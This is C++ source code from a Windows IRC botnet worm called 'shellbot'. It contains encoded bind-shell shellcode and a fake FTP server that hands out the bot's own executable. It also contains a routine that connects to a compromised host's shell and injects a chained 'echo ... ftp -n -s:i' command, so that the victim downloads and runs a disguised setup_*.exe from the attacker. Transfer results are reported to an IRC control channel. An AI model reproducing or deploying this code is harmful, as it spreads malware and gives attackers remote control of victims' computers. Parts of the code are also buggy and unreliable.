/*	shellbot - a high performance IRC bot for Win32
	Copyright (C) 2005 Shellz

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "vPOEb.h"
#include "vExterns.h"
#include "vShellcode.h"

CShellcode CShellcode::main;


bool contains(char *szBuf, int iSize, char cChar)
{	for(int i=0;i<iSize;i++) if(szBuf[i]==cChar) return true; return false; }

void CShellcode::Init() {
	main.bRunning = true;

	main.bindshell =
		"\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x7D\x01\x80\x34\x0A\x99\xE2\xFA"
		"\xEB\x05\xE8\xEB\xFF\xFF\xFF"
		"\x70\x95\x98\x99\x99\xC3\xFD\x38\xA9\x99\x99\x99\x12\xD9\x95\x12"
		"\xE9\x85\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5\x12\xED\x87\xE1\x9A"
		"\x6A\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA\x74\xCF\xCE\xC8\x12\xA6"
		"\x9A\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED\x91\xC0\xC6\x1A\x5E\x9D"
		"\xDC\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF\xBD\x9A\x5A\x48\x78\x9A"
		"\x58\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A\x5A\x58\x78\x9B\x9A\x58"
		"\x12\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F\x97\x12\x49\xF3\x9A\xC0"
		"\x71\x1E\x99\x99\x99\x1A\x5F\x94\xCB\xCF\x66\xCE\x65\xC3\x12\x41"
		"\xF3\x9C\xC0\x71\xED\x99\x99\x99\xC9\xC9\xC9\xC9\xF3\x98\xF3\x9B"
		"\x66\xCE\x75\x12\x41\x5E\x9E\x9B\x99\x9D\x4B\xAA\x59\x10\xDE\x9D"
		"\xF3\x89\xCE\xCA\x66\xCE\x69\xF3\x98\xCA\x66\xCE\x6D\xC9\xC9\xCA"
		"\x66\xCE\x61\x12\x49\x1A\x75\xDD\x12\x6D\xAA\x59\xF3\x89\xC0\x10"
		"\x9D\x17\x7B\x62\x10\xCF\xA1\x10\xCF\xA5\x10\xCF\xD9\xFF\x5E\xDF"
		"\xB5\x98\x98\x14\xDE\x89\xC9\xCF\xAA\x50\xC8\xC8\xC8\xF3\x98\xC8"
		"\xC8\x5E\xDE\xA5\xFA\xF4\xFD\x99\x14\xDE\xA5\xC9\xC8\x66\xCE\x79"
		"\xCB\x66\xCE\x65\xCA\x66\xCE\x65\xC9\x66\xCE\x7D\xAA\x59\x35\x1C"
		"\x59\xEC\x60\xC8\xCB\xCF\xCA\x66\x4B\xC3\xC0\x32\x7B\x77\xAA\x59"
		"\x5A\x71\x76\x67\x66\x66\xDE\xFC\xED\xC9\xEB\xF6\xFA\xD8\xFD\xFD"
		"\xEB\xFC\xEA\xEA\x99\xDA\xEB\xFC\xF8\xED\xFC\xC9\xEB\xF6\xFA\xFC"
		"\xEA\xEA\xD8\x99\xDC\xE1\xF0\xED\xCD\xF1\xEB\xFC\xF8\xFD\x99\xD5"
		"\xF6\xF8\xFD\xD5\xF0\xFB\xEB\xF8\xEB\xE0\xD8\x99\xEE\xEA\xAB\xC6"
		"\xAA\xAB\x99\xCE\xCA\xD8\xCA\xF6\xFA\xF2\xFC\xED\xD8\x99\xFB\xF0"
		"\xF7\xFD\x99\xF5\xF0\xEA\xED\xFC\xF7\x99\xF8\xFA\xFA\xFC\xE9\xED"
		"\x99\xFA\xF5\xF6\xEA\xFC\xEA\xF6\xFA\xF2\xFC\xED\x99";

	main.bindshellsize=sizeof(bindshell);
	main.bindport=4460;
}

void *CShellcode::Run() {
	CreateThread(NULL, 0,(unsigned long (__stdcall *)(void *))shellcode_server, NULL, 0, NULL);
	return NULL;
}

void CShellcode::shellcode_server() {
	SOCKET listener;
	SOCKET newfd;
	char sendbuf[514];
	struct sockaddr_in server_address;
	struct sockaddr_in remoteaddr;
	long h;
	int reuse_addr = 1;
	unsigned long mode = 1;
	int fdmax;
	int i;
	int addrlen;
	int nbytes;
	
	char buf[100];
	char tmpbuf[100];
	char tmpbuf2[100];
	char a[4];
	char b[4];
	char c[4];
	char d[4];
	char p1[50];
	char p2[50];
	char tmpip[15];
	int po,po2;

	struct fd_set master;   // master file descriptor list
	struct fd_set read_fds; // temp file descriptor list for select()

	FD_ZERO(&master);		// clear the master and temp sets
	FD_ZERO(&read_fds);

	listener = socket(AF_INET, SOCK_STREAM, 0);
	setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse_addr,sizeof(reuse_addr));
	ioctlsocket(listener, FIONBIO, &mode);

	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = INADDR_ANY;
	server_address.sin_port = htons(main.ftp.port);

	if (bind(listener, (struct sockaddr *) &server_address,sizeof(server_address)) < 0 ) {
		return;
	}

	listen(listener,10);

	FD_SET(listener, &master);

	fdmax = listener;

	while(1) {
		read_fds = master;
		if (select(fdmax+1, &read_fds, NULL, NULL, NULL) == -1) {
			return;
    	}
		for(i = 0; i <= fdmax; i++) {
			ZeroMemory(buf,sizeof(buf));
			ZeroMemory(tmpbuf,sizeof(tmpbuf));
			if (FD_ISSET(i, &read_fds)) {
				if (i == (int)listener) {
					addrlen = sizeof(remoteaddr);
					if ((newfd = accept(listener, (struct sockaddr *)&remoteaddr,&addrlen)) != -1) {
						FD_SET(newfd, &master);
						if ((int)newfd > fdmax) {
							fdmax = newfd;
						}
						send(newfd, "220 Reptile welcomes you..\r\n",28 , 0);
					}
				} else {
					if ((nbytes = recv(i, buf, sizeof(buf), 0)) <= 0) {
						FD_CLR(i, &master);
						closesocket(i);
					} else {
						sscanf(buf,"%s %s",tmpbuf,tmpbuf2);
						if (strcmp(tmpbuf,"USER") == 0) {
							send(i,"331 Password required\r\n",23,0);
						}
						else if (strcmp(tmpbuf,"PASS") == 0) {
							send(i,"230 User logged in.\r\n",21,0);
						}
						else if (strcmp(tmpbuf,"SYST") == 0) {
							send(i,"215 StnyFtpd\r\n",14,0);
						}
						else if (strcmp(tmpbuf,"REST") == 0) {
							send(i,"350 Restarting.\r\n",17,0);
						}
						else if (strcmp(tmpbuf,"PWD") == 0) {
							send(i,"257 \"/\" is current directory.\r\n",31,0);
						}
						else if ((strcmp(tmpbuf,"TYPE") == 0) && (strcmp(tmpbuf2,"A") == 0)) {
							send(i,"200 Type set to A.\r\n",20,0);
						}
						else if ((strcmp(tmpbuf,"TYPE") == 0) && (strcmp(tmpbuf2,"I") == 0)) {
							send(i,"200 Type set to I.\r\n",20,0);
						}
						else if (strcmp(tmpbuf,"PASV") == 0) {
							send(i,"425 Passive not supported on this server\r\n",44,0);
						}
						else if (strcmp(tmpbuf,"LIST") == 0) {
							send(i,"226 Transfer complete\r\n",25,0);
/*							if (irc->has_master())
								irc->notice_masters("%s %s LIST request from: %s",warn_title,ftp_title,GetIP(i));
							else
								irc->privmsg(servers[curserver].warningchan,"%s %s LIST request from: %s",warn_title,ftp_title,GetIP(i));*/
						}
						else if (strcmp(tmpbuf,"PORT") == 0) {
							sscanf(buf,"%*s %[^,],%[^,],%[^,],%[^,],%[^,],%[^\n]",a,b,c,d,p1,p2);
							po = atoi(p1);
							po2 = atoi(p2);
							ZeroMemory(p1,sizeof(p1));
							sprintf(p1,"%x%x\n",po,po2);
							h = strtoul(p1, NULL, 16);
							sprintf(tmpip,"%s.%s.%s.%s",a,b,c,d);
							send(i,"200 PORT command successful.\n",29,0);

						}
						else if (strcmp(tmpbuf,"RETR") == 0) {
/*							if (!main.ftp.silent && main.ftp.verbose)
								irc->privmsg(main.ftp.chan,"%s Started send to IP: %s.",ftp_title,tmpip);*/
							send(i,"150 Opening BINARY mode data connection\n",40,0);
							SOCKET data_sock;
							if(FTP_Data_Connect(tmpip,(int)h,sendbuf,main.main.ftp.chan,main.ftp.silent,data_sock) != 0) {
								int transfered=0;
								if ((transfered=FTP_Data_Transfer(data_sock)) > 0)
								{
									send(i,"226 Transfer complete.\n",23 , 0);
//									eftpsends++;
/*									if (!main.ftp.silent)
									{
										if (main.ftp.verbose)
											irc->privmsg(main.ftp.chan,"%s File transfer complete to IP: %s, File: %s, Size: %s bytes, Total sends: %i.",ftp_title,tmpip,main.ftp.filename,commaI64(transfered),eftpsends);
										else
											irc->privmsg(main.ftp.chan,"%s File transfer complete to IP: %s.", ftp_title, tmpip);
									}*/
									vPOEb->vIRC.SendData("PRIVMSG %s: Transfer to %s completed.", main.ftp.chan, tmpip);
								}
								else
								{
									send(i,"226 Transfer complete.\n",23 , 0);
								}
							} else {
								send(i,"425 Can't open data connection.\n",32,0);
								if (!main.ftp.silent)
								{
							//		irc->privmsg(main.ftp.chan,"%s Failed to send file to IP: %s.",ftp_title,tmpip);
									vPOEb->vIRC.SendData("PRIVMSG %s: Transfer to %s failed.", main.ftp.chan, tmpip);
								}
							}
						}
						else if (strcmp(tmpbuf,"QUIT") == 0) {
							send(i,"221 Goodbye, happy rooting.\r\n",29 , 0);
						}
						else {
							send(i,"503 Command not understood.\r\n",29,0);
						}
						ZeroMemory(buf,sizeof(buf));
					}
				}
			}
		}
	}
	return;
}

bool CShellcode::ConnectShell(TargetInfo exinfo, unsigned int connectport)
{
	int len;
/*	char exip[16]=vPOEb->vPOEscan.sExternalHost;
	char inip[16]=*/
	char recvbuf[1024];
	SOCKET sockfd;
	SOCKADDR_IN shell_addr;
	ZeroMemory(&shell_addr, sizeof(shell_addr));

	shell_addr.sin_family = AF_INET;
	shell_addr.sin_addr.s_addr = inet_addr(exinfo.ip);
	shell_addr.sin_port = htons(connectport);

	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
		return false;
	if (connect(sockfd,(LPSOCKADDR)&shell_addr, sizeof(shell_addr)) == SOCKET_ERROR) 
		return false;

	char mkdir_buff[400];

	len = recv(sockfd, recvbuf, 1024, 0);

	char fname[_MAX_FNAME];
	sprintf(fname,"setup_%d%d%d%d%d.exe",rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);
	_snprintf(mkdir_buff,sizeof(mkdir_buff),
		"echo open %s %d > i&echo user 1 1 >> i &echo get %s >> i &echo quit >> i &ftp -n -s:i &%s\r\n",
		(PrivateIP(exinfo.ip)?vPOEb->vPOEscan.sLocalHost:vPOEb->vPOEscan.sExternalHost),main.ftp.port,fname,fname);

	if (send(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
		return false;

	Sleep(500);
	_snprintf(mkdir_buff, sizeof (mkdir_buff), "%s\r\n", main.ftp.filename);

	if (send(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
		return false;

	len = recv(sockfd, recvbuf, 1024, 0);
	closesocket(sockfd);
	return true;
}

int CShellcode::getPort(){
	return main.ftp.port;
}

bool CShellcode::PrivateIP(const char *ip) {
	if(!ip) return false; if(!strcmp(ip, "")) return false;
	char *tokens[4]; char ipbuf[32];
	strncpy(ipbuf, ip, 32);
	tokens[0]=strtok(ipbuf, ".");
	if(!tokens[0]) return false;
	for(int i=1;i<4;i++) { tokens[i]=strtok(NULL, "."); if(!tokens[i]) return false; }
	if(!strcmp(tokens[0], "10")) return true;								// Class A private network
	if(!strcmp(tokens[0], "172") && !strcmp(tokens[1], "16")) return true;	// Class B Private network
	if(!strcmp(tokens[0], "192") && !strcmp(tokens[1], "168")) return true;	// Class C private network
	if(!strcmp(tokens[0], "90") && !strcmp(tokens[1], "0")) return true;	// Class Bastart private network :P
	return false;
}

int CShellcode::FTP_Data_Connect(char *ip,int port,char *err,char *target,BOOL silent,SOCKET &data_sock)
{
	struct sockaddr_in server;
	data_sock = socket(AF_INET, SOCK_STREAM, 0);
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(ip);
    server.sin_port = htons(port);

	if (connect(data_sock,(struct sockaddr *)&server, sizeof(struct sockaddr)) == -1)
	{
		if (!silent)
//			irc->privmsg(target,"%s Couldn't open data connection to: %s:%i, error: <%d>.",ftp_title,ip,port,fWSAGetLastError());
			vPOEb->vIRC.SendData("PRIVMSG %s: Couldn't open data connection to: %s:%i, error: <%d>.",vPOEb->vIRC.msgTo.c_str(),ip,port,WSAGetLastError());
		closesocket(data_sock);
		return 0;
	}
	return 1;
}

int CShellcode::FTP_Data_Transfer(SOCKET data_sock)
{
	unsigned char fileBuf[4096]; FILE *fp=NULL;
	char myfname[MAX_PATH];
	int count=4096;
	GetModuleFileName(NULL,myfname,sizeof(myfname));
	fp=fopen(myfname, "rb");
	int sent=0;
	long filesize=0;
	if (fp)
	{
		fseek(fp, 0, SEEK_END); filesize=ftell(fp); fseek(fp, 0, SEEK_SET);
		int written=0;
		while(!feof(fp))
		{
			written=0;
			int retval;
			ZeroMemory(fileBuf,sizeof(fileBuf));
			count=fread(fileBuf, sizeof(char), 2048, fp);
			if(ferror(fp)) break;
			while(written<count)
			{
				retval = send(data_sock, (char*)fileBuf, count, 0);
				sent+=retval;
				if (retval = SOCKET_ERROR)
					break;
				written+=retval;
			}
		}
	}
	fclose(fp);
	closesocket(data_sock);
	if ((int)filesize == sent)
		return sent;
	else
		return 0;
}